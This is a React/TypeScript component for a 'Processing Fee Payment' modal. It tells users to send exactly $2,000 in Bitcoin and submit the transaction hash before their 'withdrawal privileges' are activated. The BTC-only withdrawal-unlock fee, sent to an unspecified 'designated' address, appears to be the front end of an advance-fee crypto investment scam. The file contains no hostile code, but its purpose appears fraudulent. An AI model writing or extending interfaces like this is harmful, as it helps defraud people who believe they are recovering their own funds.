import { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { SiBitcoin } from "react-icons/si";
import { AlertTriangle, Shield, Info } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { apiClient } from "@/lib/apiClient";

interface ProcessingFeePaymentModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onSuccess?: () => void;
}

export function ProcessingFeePaymentModal({
  open,
  onOpenChange,
  onSuccess,
}: ProcessingFeePaymentModalProps) {
  const [transactionHash, setTransactionHash] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();

  const PROCESSING_FEE_AMOUNT = 2000;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!transactionHash.trim() || !walletAddress.trim()) {
      toast({
        title: "Missing Information",
        description: "Please provide both your wallet address and transaction hash.",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      // Submit as a special deposit request for processing fee
      await apiClient.submitDeposit({
        amount: PROCESSING_FEE_AMOUNT,
        asset: "BTC",
        transactionHash: transactionHash.trim(),
        walletAddress: walletAddress.trim(),
        paymentMethod: "crypto",
        notes: "PROCESSING FEE PAYMENT - Withdrawal activation fee",
      });

      toast({
        title: "Processing Fee Submitted Successfully",
        description: "Your processing fee payment has been submitted for review. You will be notified once the payment is approved, and your withdrawal privileges will be activated within 24 hours.",
        duration: 8000,
      });

      // Reset form
      setTransactionHash("");
      setWalletAddress("");
      onOpenChange(false);
      
      // Trigger success callback
      onSuccess?.();
    } catch (error: any) {
      toast({
        title: "Submission Failed",
        description:
          error.message || "Failed to submit processing fee payment. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-lg max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2 text-lg">
            <Shield className="h-5 w-5 text-primary" />
            Processing Fee Payment
          </DialogTitle>
          <DialogDescription>
            Submit your $2,000 processing fee payment in Bitcoin
          </DialogDescription>
        </DialogHeader>

        <form onSubmit={handleSubmit} className="space-y-5 py-2">
          {/* Fee Amount Display */}
          <Card className="p-4 bg-primary/5 border-primary/20">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="p-2 bg-orange-100 dark:bg-orange-900/30 rounded-full">
                  <SiBitcoin className="h-6 w-6 text-orange-600" />
                </div>
                <div>
                  <p className="text-sm text-muted-foreground">Processing Fee Amount</p>
                  <p className="text-2xl font-bold font-mono">${PROCESSING_FEE_AMOUNT.toLocaleString()} USD</p>
                </div>
              </div>
              <Badge className="bg-orange-600">BTC Only</Badge>
            </div>
          </Card>

          {/* Instructions */}
          <Card className="p-4 bg-blue-50/50 dark:bg-blue-950/20 border-blue-200 dark:border-blue-800">
            <div className="flex items-start gap-3">
              <Info className="h-5 w-5 text-blue-600 mt-0.5 shrink-0" />
              <div className="space-y-2 text-sm">
                <p className="font-semibold text-blue-900 dark:text-blue-100">
                  Payment Instructions:
                </p>
                <ol className="list-decimal ml-4 space-y-1 text-blue-800 dark:text-blue-200">
                  <li>Transfer exactly $2,000 USD equivalent in Bitcoin (BTC) to your designated payment address</li>
                  <li>Enter your sending wallet address below</li>
                  <li>Enter the transaction hash from your Bitcoin wallet</li>
                  <li>Submit for administrative verification</li>
                </ol>
              </div>
            </div>
          </Card>

          {/* Form Fields */}
          <div className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="wallet-address" className="text-sm font-medium">
                Your BTC Wallet Address
                <span className="text-destructive ml-1">*</span>
              </Label>
              <Input
                id="wallet-address"
                value={walletAddress}
                onChange={(e) => setWalletAddress(e.target.value)}
                placeholder="Enter your Bitcoin wallet address"
                className="h-11 font-mono text-sm"
                required
              />
              <p className="text-xs text-muted-foreground">
                The wallet address from which you sent the BTC payment
              </p>
            </div>

            <div className="space-y-2">
              <Label htmlFor="transaction-hash" className="text-sm font-medium">
                Transaction Hash (TXID)
                <span className="text-destructive ml-1">*</span>
              </Label>
              <Input
                id="transaction-hash"
                value={transactionHash}
                onChange={(e) => setTransactionHash(e.target.value)}
                placeholder="Enter blockchain transaction hash"
                className="h-11 font-mono text-sm"
                required
              />
              <p className="text-xs text-muted-foreground">
                The transaction ID provided by your Bitcoin wallet after sending
              </p>
            </div>
          </div>

          {/* Warning Notice */}
          <div className="flex items-start gap-2 p-3 bg-orange-50 dark:bg-orange-950/20 rounded-lg border border-orange-200 dark:border-orange-800">
            <AlertTriangle className="h-4 w-4 text-orange-600 mt-0.5 shrink-0" />
            <div className="text-xs text-orange-700 dark:text-orange-300">
              <p className="font-medium mb-1">Important Notice:</p>
              <ul className="space-y-0.5">
                <li>• Only Bitcoin (BTC) payments are accepted for the processing fee</li>
                <li>• Ensure the transaction amount equals $2,000 USD in BTC</li>
                <li>• Verification typically completes within 24 hours</li>
                <li>• Double-check all information before submitting</li>
                <li>• Your withdrawal access will be enabled upon approval</li>
              </ul>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="flex flex-col sm:flex-row gap-3 pt-2">
            <Button
              type="button"
              variant="outline"
              className="flex-1 h-11"
              onClick={() => onOpenChange(false)}
              disabled={isSubmitting}
            >
              Cancel
            </Button>
            <Button
              type="submit"
              className="flex-1 h-11 bg-primary hover:bg-primary/90"
              disabled={isSubmitting || !walletAddress.trim() || !transactionHash.trim()}
            >
              {isSubmitting ? "Submitting..." : "Submit Processing Fee Payment"}
            </Button>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
}

function Badge({ children, className }: { children: React.ReactNode; className?: string }) {
  return (
    <span className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${className}`}>
      {children}
    </span>
  );
}
